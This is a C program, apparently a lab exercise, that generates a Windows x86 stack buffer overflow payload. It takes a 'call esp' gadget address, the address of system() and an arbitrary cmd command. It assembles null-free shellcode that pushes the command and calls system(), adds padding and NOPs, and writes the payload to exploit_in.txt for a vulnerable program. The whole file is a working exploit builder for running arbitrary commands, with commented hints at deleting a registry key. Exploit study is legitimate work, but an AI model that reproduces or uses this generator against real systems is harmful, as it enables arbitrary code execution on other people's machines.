#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>


unsigned int callESP = 0x76C5B208; // call esp in kernelbase register addr 51 24 CF 76
unsigned int systemfnaddr = 0x7661C730; // system in ucrtbase в отладочных символах
int bufferSize = 100;
int NOPcount = 30;
char callespchar[1024] = { '\0' };
void swap(char* a, char* b) {
    char temp = *a;
    *a = *b;
    *b = temp;
}

void add_byte(char* asm, int* index, const char byte) {
    asm[*index] = byte;
    (*index)++;
}

void add_bytes(char* asm, int* index, const char* bytes, int byteslen) {
    for (int i = 0; i < byteslen; i++)
        add_byte(asm, index, bytes[i]);
}

void print_asm(char* asm, int index) {
    const char* alphabet = "0123456789ABCDEF";
    printf("Your evil exploit bytes >:3\n\n");
    for (int i = 0; i < bufferSize; i++) {
        printf("41 ");

    }
    for (int i = 0; i < strlen(callespchar); i+=2) {
        printf("%c", callespchar[i]);
        printf("%c", callespchar[i+1]);
        printf(" ");
    }
    
    for (int i = 0; i < index; i++) {
        unsigned char left = alphabet[(asm[i] & 0b11110000) >> 4];
        unsigned char right = alphabet[asm[i] & 0b00001111];
        printf("%c%c ", left, right);
    }
    printf("\n");
}



void IntToHex(char* hex_str, int N) {
    char temp[1024] = { '\0' };
    if (hex_str == NULL) {
        // Не удалось выделить память.
        return NULL;
    }

    // Форматируем число в шестнадцатеричный вид и сохраняем в строку.
    sprintf(temp, "%08X", N);

    size_t len = strlen(temp);


    
    if (hex_str == NULL) {
        printf("Ошибка выделения памяти.n");
        return NULL;
    }
    for (size_t i = 0; i < len; i += 2) {
        hex_str[i] = temp[len - 2 - i];
        hex_str[i + 1] = temp[len - 1 - i];
    }
    

    hex_str[len] = '\0';

}
int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Supply registry key name.");
        _getch();
        return 0;
    }


    
    printf("..................................................Shell C0de generator..................................................\n\n");
    
    char syscall[300] = { '\0' };

    
    bufferSize += 4;
    printf("Enter call esp  ");

    scanf("%x", &callESP);
    IntToHex(callespchar, callESP);
    //printf("%s", callespchar);
    printf("\nEnter system address  ");

    scanf("%x", &systemfnaddr);

    getchar();  // Для очистки буфера
    char cmd_command[1024];
    printf("\nEnter cmd command  ");
    scanf("%[^\n]s", cmd_command);

    strcpy(syscall, cmd_command);

    


    //strcat(syscall, argv[1]);
    //strcat(syscall, "\" /f"); //   /f Выполняет принудительное удаление без запроса подтверждения.



    char asm[600] = { 0x31, 0xC0, 0x50 }; // xor eax,eax 31 C0
    //push eax 50

    //Сначала ксорим два регистра чтобы получить \0 , а потом  его пихаем в стек. 

    int asmi = 3;

    // push symbols safely
    // by 4 bytes
    // padding right to x4 symbols
    int callLen = strlen(syscall);
    int symbolsLeft = callLen % 4;

    if (callLen % 4 != 0) {
        const char add[5] = { 0x05, 0x01, 0x01, 0x01, 0x01 };
        if (symbolsLeft == 3) {
            // mov eax,XXXXXX01    B8 01YYYYYY
            // add eax,01010101    05 01010101
            // sub eax,01010102    2D 02010101
            char mov[5] = { 0xB8, 0x01 };
            char sub[5] = { 0x2D, 0x01, 0x01, 0x01, 0x02 };
            for (int i = 2; i < 5; i++)
                mov[i] = syscall[(callLen - 1) - (i - 2)];

            swap(&mov[1], &mov[4]);
            swap(&mov[2], &mov[3]);

            add_bytes(asm, &asmi, mov, 5);
            add_bytes(asm, &asmi, add, 5);
            add_bytes(asm, &asmi, sub, 5);
        }
        else if (symbolsLeft == 2) {
            // mov eax,XXXX0101     B8 0101YYYY
            // add eax,01010101     05 01010101
            // sub eax,01010202     2D 02020101
            char mov[5] = { 0xB8, 0x01, 0x01 };
            char sub[5] = { 0x2D, 0x01, 0x01, 0x02, 0x02 };
            for (int i = 3; i < 5; i++)
                mov[i] = syscall[(callLen - 1) - (i - 3)];

            swap(&mov[1], &mov[4]);
            swap(&mov[2], &mov[3]);

            add_bytes(asm, &asmi, mov, 5);
            add_bytes(asm, &asmi, add, 5);
            add_bytes(asm, &asmi, sub, 5);
        }
        else {
            // mov eax,XX010101     B8 010101YY
            // add eax,01010101     05 01010101
            // sub eax,01020202     2D 02020201
            char mov[5] = { 0xB8, 0x01, 0x01, 0x01 };
            char sub[5] = { 0x2D, 0x01, 0x02, 0x02, 0x02 };
            for (int i = 4; i < 5; i++)
                mov[i] = syscall[(callLen - 1) - (i - 4)];

            swap(&mov[1], &mov[4]);
            swap(&mov[2], &mov[3]);

            add_bytes(asm, &asmi, mov, 5);
            add_bytes(asm, &asmi, add, 5);
            add_bytes(asm, &asmi, sub, 5);
        }
        // push eax     50
        add_byte(asm, &asmi, 0x50);
    }

    char push[5] = { 0x68 };
    for (int i = callLen - 1 - symbolsLeft; i >= 0; i--) {
        // push 0xXXXXXXXX      68 YYYYYYYY
        int remainder = i % 4;
        push[4 - remainder] = syscall[i];
        if (remainder == 0) {
            swap(&push[1], &push[4]);
            swap(&push[2], &push[3]);
            add_bytes(asm, &asmi, push, 5);
        }
    }

    // push esp             54
    add_byte(asm, &asmi, 0x54);

    // push 0x69696969 // pseudo eip push, crashes the program
    char pseudoEIP[5] = { 0x68, 0x69, 0x69, 0x69, 0x69 };
    add_bytes(asm, &asmi, pseudoEIP, 5);
    
    // push 0xADDRESS_SYSTEM() to stack
    
    // IF systemfnaddr CONTAINS PROHIBITED BYTES SUCH AS 00, 0A
    int saltedAddress = systemfnaddr + 0x01010101;
    char* address_bytes = (char*)(&saltedAddress);
    // mov eax, saltedAddress
    add_byte(asm, &asmi, 0xB8);
    add_byte(asm, &asmi, *address_bytes);
    add_byte(asm, &asmi, *(address_bytes + 1));
    add_byte(asm, &asmi, *(address_bytes + 2));
    add_byte(asm, &asmi, *(address_bytes + 3));
    // sub eax,0x01010101
    add_byte(asm, &asmi, 0x2D);
    add_byte(asm, &asmi, 0x01);
    add_byte(asm, &asmi, 0x01);
    add_byte(asm, &asmi, 0x01);
    add_byte(asm, &asmi, 0x01);
    // push eax
    add_byte(asm, &asmi, 0x50);
    
    // IF systemfnaddr WITHOUT PROHIBITED BYTES
    /*
    char* address_bytes = (char*)(&systemfnaddr);
    add_byte(asm, &asmi, 0x68);
    add_byte(asm, &asmi, *address_bytes);
    add_byte(asm, &asmi, *(address_bytes + 1));
    add_byte(asm, &asmi, *(address_bytes + 2));
    add_byte(asm, &asmi, *(address_bytes + 3));
    */

    // ret
    add_byte(asm, &asmi, 0xC3);

    // nop's
    for (int i = 0; i < NOPcount; i++)
        add_byte(asm, &asmi, 0x90);

    print_asm(asm, asmi);

    FILE* programInput;
    programInput = fopen("exploit_in.txt", "w");
    
    for (int i = 0; i < bufferSize; i++)
        fprintf(programInput, "%c", 0x41);

    char* callESP_bytes = (char*)(&callESP);
    for (int i = 0; i < 4; i++)
        fprintf(programInput, "%c", *(callESP_bytes + i));
    
    for (int i = 0; i < NOPcount; i++)
        fprintf(programInput, "%c", 0x90);

    add_byte(asm, &asmi, 0x00); // for fprintf() enclosing
    fprintf(programInput, "%s", asm);

    fclose(programInput);

    //printf("\nKey for deletion: HKEY_CURRENT_USER\\BufferOverflowTest\\%s\n", argv[1]);
    //printf("\nParams:\nCall esp address: %h\nSystem funcrion call: %h\nBuffer size: %d\nNo operation counter: %d\n\n", callESP, systemfnaddr, bufferSize, NOPcount);
    //printf("Press any key to run vulnerable program...\n");
    _getch();

    //system("VulnerableProgram.exe < exploit_in.txt");
}